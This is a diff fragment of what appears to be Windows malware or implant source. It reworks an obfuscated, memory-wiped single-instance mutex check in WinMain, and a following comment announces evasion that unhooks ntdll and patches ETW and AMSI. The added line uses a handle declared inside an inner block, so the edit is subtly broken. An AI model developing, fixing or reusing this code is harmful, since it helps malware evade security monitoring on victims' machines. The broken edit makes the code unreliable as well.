@@ -269,9 +269,10 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
             mutexName[_i] = rawMutex[_i];
         mutexName[mLen] = '\0';
 #endif
-        CreateMutexA(NULL, FALSE, mutexName);
+        HANDLE hMutex = CreateMutexA(NULL, FALSE, mutexName);
         SecureZeroMemory(mutexName, sizeof(mutexName));
     }
+    if (hMutex == NULL && GetLastError() != ERROR_ALREADY_EXISTS) return 0xEEB15;
     if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
 
     /* ── 1a. Evasion: unhook ntdll, patch ETW + AMSI ─────────────────── */
